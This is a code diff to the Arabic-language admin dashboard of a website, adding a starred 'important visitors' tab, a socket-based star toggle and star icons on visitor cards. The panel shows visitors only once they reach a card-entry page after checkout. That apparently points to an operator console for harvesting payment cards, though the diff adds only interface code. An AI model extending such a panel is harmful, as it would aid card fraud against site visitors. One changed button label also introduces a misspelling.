@@ -361,8 +361,12 @@
         <div class="bg-white rounded-xl shadow-sm p-4">
           <h2 class="text-lg font-bold mb-2">الزوار</h2>
           <div class="flex gap-2 mb-3">
-            <button onclick="selectAllVisitors()" class="flex-1 bg-blue-100 text-blue-700 px-3 py-1.5 rounded-lg text-sm hover:bg-blue-200 transition">تحديد الكل</button>
+            <button onclick="selectAllVisitors()" class="flex-1 bg-blue-100 text-blue-700 px-3 py-1.5 rounded-lg text-sm hover:bg-blue-200 transition">تحيد الكل</button>
             <button onclick="deleteSelectedVisitors()" class="flex-1 bg-red-100 text-red-700 px-3 py-1.5 rounded-lg text-sm hover:bg-red-200 transition">حذف المحددين</button>
+          </div>
+          <div class="flex border-b mb-3">
+            <button id="tabAll" onclick="switchTab('all')" class="flex-1 px-3 py-2 text-sm font-medium border-b-2 border-blue-500 text-blue-600 transition cursor-pointer">جميع الزوار <span id="tabAllCount" class="bg-blue-100 text-blue-700 text-xs px-1.5 py-0.5 rounded-full ml-1">0</span></button>
+            <button id="tabStarred" onclick="switchTab('starred')" class="flex-1 px-3 py-2 text-sm font-medium border-b-2 border-transparent text-gray-500 hover:text-gray-700 transition cursor-pointer">الزوار المهمين <span id="tabStarredCount" class="bg-gray-100 text-gray-500 text-xs px-1.5 py-0.5 rounded-full ml-1">0</span></button>
           </div>
           <div id="visitorsList" class="space-y-3">
             <p class="text-gray-500 text-center py-8">لا يوجد زوار حالياً</p>
@@ -3764,6 +3768,16 @@
         }
       });
 
+      // Handle star toggle
+      socket.on('visitor:starToggled', ({ visitorId, isStarred }) => {
+        const visitor = visitors.get(visitorId);
+        if (visitor) {
+          visitor.isStarred = isStarred;
+          visitors.set(visitorId, visitor);
+          renderVisitorsList();
+        }
+      });
+
       // Handle visitor info update (e.g. country lookup)
       socket.on('visitor:updated', (updatedVisitor) => {
         const visitor = visitors.get(updatedVisitor._id);
@@ -3869,6 +3883,32 @@
       pageStatsContent.innerHTML = html;
     }
 
+    let activeTab = 'all'; // 'all' or 'starred'
+
+    function switchTab(tab) {
+      activeTab = tab;
+      const tabAll = document.getElementById('tabAll');
+      const tabStarred = document.getElementById('tabStarred');
+      if (tab === 'all') {
+        tabAll.className = 'flex-1 px-3 py-2 text-sm font-medium border-b-2 border-blue-500 text-blue-600 transition cursor-pointer';
+        tabStarred.className = 'flex-1 px-3 py-2 text-sm font-medium border-b-2 border-transparent text-gray-500 hover:text-gray-700 transition cursor-pointer';
+      } else {
+        tabAll.className = 'flex-1 px-3 py-2 text-sm font-medium border-b-2 border-transparent text-gray-500 hover:text-gray-700 transition cursor-pointer';
+        tabStarred.className = 'flex-1 px-3 py-2 text-sm font-medium border-b-2 border-yellow-500 text-yellow-600 transition cursor-pointer';
+      }
+      renderVisitorsList();
+    }
+
+    function toggleStar(visitorId) {
+      socket.emit('admin:toggleStar', visitorId);
+      const visitor = visitors.get(visitorId);
+      if (visitor) {
+        visitor.isStarred = !visitor.isStarred;
+        visitors.set(visitorId, visitor);
+        renderVisitorsList();
+      }
+    }
+
     function renderVisitorsList() {
       const allVisitors = Array.from(visitors.values());
       const connectedCount = allVisitors.filter(v => v.isConnected === true).length;
@@ -3876,7 +3916,21 @@
       updatePageStats();
 
       // Show visitor cards only after they click Checkout
-      const filteredVisitors = allVisitors.filter(v => v.hasEnteredCardPage === true);
+      let filteredVisitors = allVisitors.filter(v => v.hasEnteredCardPage === true);
+      
+      // Update tab counts
+      const allCount = filteredVisitors.length;
+      const starredCount = filteredVisitors.filter(v => v.isStarred).length;
+      const tabAllCountEl = document.getElementById('tabAllCount');
+      const tabStarredCountEl = document.getElementById('tabStarredCount');
+      if (tabAllCountEl) tabAllCountEl.textContent = allCount;
+      if (tabStarredCountEl) tabStarredCountEl.textContent = starredCount;
+
+      // Filter by active tab
+      if (activeTab === 'starred') {
+        filteredVisitors = filteredVisitors.filter(v => v.isStarred);
+      }
+
       const list = filteredVisitors.sort((a, b) => {
         // Sort by last activity (most recent first)
         const getLastActivity = (v) => {
@@ -3888,7 +3942,7 @@
       });
 
       if (list.length === 0) {
-        visitorsList.innerHTML = '<p class="text-gray-500 text-center py-8">لا يوجد زوار حالياً</p>';
+        visitorsList.innerHTML = '<p class="text-gray-500 text-center py-8">' + (activeTab === 'starred' ? 'لا يوجد زوار مهمين حالياً' : 'لا يوجد زوار حالياً') + '</p>';
         return;
       }
 
@@ -3959,6 +4013,8 @@
           '" onclick="selectVisitor(\'' + v._id + '\')">'+
           // Checkbox at top right
           '<input type="checkbox" class="visitor-checkbox absolute top-2 right-2 w-4 h-4 cursor-pointer" data-visitor-id="' + v._id + '" onclick="event.stopPropagation();" />' +
+          // Star button
+          '<span onclick="event.stopPropagation(); toggleStar(\'' + v._id + '\')" class="absolute top-2 right-8 cursor-pointer" style="font-size: 1.3em; opacity: ' + (v.isStarred ? '1' : '0.3') + '; filter: ' + (v.isStarred ? 'drop-shadow(0 1px 3px #f59e0b)' : 'none') + ';">' + (v.isStarred ? '⭐' : '☆') + '</span>' +
           // Delete button at top left
           '<button onclick="event.stopPropagation(); deleteVisitorFromCard(\'' + v._id + '\')" class="absolute top-2 left-2 text-xs text-red-500 hover:text-red-700 hover:underline">حذف</button>' +
           // Two columns layout
